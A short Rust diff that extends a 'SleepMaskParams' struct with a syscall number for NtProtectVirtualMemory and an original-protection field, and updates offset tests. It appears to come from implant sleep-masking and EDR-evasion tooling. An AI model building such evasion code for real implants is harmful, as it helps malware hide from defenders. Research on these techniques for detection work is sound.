@@ -43,6 +43,8 @@ pub struct SleepMaskParams {
     pub _pad: u32,         // +0x2C
     pub gadget: usize,     // +0x30 (rotated per cycle)
     pub interval: i64,     // +0x38 (relative delay)
+    pub protect_ssn: u32,  // +0x40 (NtProtectVirtualMemory)
+    pub orig_protect: u32, // +0x44 (image protection, probed at bootstrap)
 }
 
 /// Walk down from a hint address in fixed steps, returning the first
@@ -114,7 +116,9 @@ mod tests {
         assert_eq!(offset_of!(SleepMaskParams, ssn), 0x28);
         assert_eq!(offset_of!(SleepMaskParams, gadget), 0x30);
         assert_eq!(offset_of!(SleepMaskParams, interval), 0x38);
-        assert_eq!(core::mem::size_of::<SleepMaskParams>(), 0x40);
+        assert_eq!(offset_of!(SleepMaskParams, protect_ssn), 0x40);
+        assert_eq!(offset_of!(SleepMaskParams, orig_protect), 0x44);
+        assert_eq!(core::mem::size_of::<SleepMaskParams>(), 0x48);
     }
 
     #[test]
